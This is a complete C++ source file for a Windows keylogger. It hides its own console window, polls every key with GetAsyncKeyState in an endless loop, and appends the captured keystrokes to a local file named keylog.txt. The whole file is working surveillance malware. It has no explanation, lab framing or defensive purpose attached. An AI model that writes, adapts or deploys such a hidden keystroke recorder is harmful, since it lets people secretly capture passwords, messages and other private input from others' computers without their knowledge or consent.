#include <iostream>
#include <windows.h>
#include <fstream>

void stealthMode() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

void logKey(int key) {
    std::ofstream outFile("keylog.txt", std::ios::app);
    if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT || 
        key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || 
        key == VK_MENU || key == VK_LMENU || key == VK_RMENU || 
        key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_SCROLL)
        return;

    if (key == VK_BACK)
        outFile << "<BACKSPACE>";
    else if (key == VK_RETURN)
        outFile << "<ENTER>";
    else if (key == VK_SPACE)
        outFile << " ";
    else if (key == VK_TAB)
        outFile << "<TAB>";
    else
        outFile << char(key);

    outFile.close();
}

int main() {
    stealthMode();
    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                logKey(key);
            }
        }
        Sleep(10);
    }
    return 0;
}
